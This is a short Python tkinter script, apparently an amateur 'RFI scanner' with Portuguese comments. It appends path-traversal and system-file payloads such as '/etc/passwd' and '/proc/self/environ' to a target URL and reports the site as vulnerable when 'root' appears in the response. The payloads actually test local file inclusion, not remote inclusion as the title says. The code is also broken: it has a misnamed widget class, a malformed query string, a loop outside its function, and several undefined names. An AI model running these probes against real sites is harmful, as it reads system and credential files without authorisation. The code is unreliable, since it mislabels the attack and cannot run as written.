import requests
import tkinter as tk
from tkinter import ttk

#criando a GUI
root = tk.Tk()
root.geometry("700x400")
root.title("RFI scanner")

#criando o input
url_label = tk.label(root, text="URL")
url_label.grid(row=0, column=0, sticky="W", padx=10, pady=10)

#barra de progresso
pb = ttk.Progressbar(root, orient='horizontal', mode='indeterminate', length=280)
pb.grid(row=1, column=0, columnspan=3, padx=10, pady=10, sticky="e")

#

def run_scan():
    result_label.config(text="")
    pb.start(100)
    update_progress_bar()
    url = entry.get()
    
    # list of files to check for RFI
    files = ["/etc/passwd", "/proc/self/environ", "../../../../../../../etc/passwd"]
    
for file in files:
    rfi_url = url + "?page" + file
    response = requests.get(rfi_url)
    if "root" in response.text:
        result_label.config(text=result_label.cget("text") + f"[+] is vulnerable to RFI: {rfi_url}")
    else:
        result_label.config(text=result_label.cget("text") + f"[+] is not vulnerable to RFI:{rfi_url}")

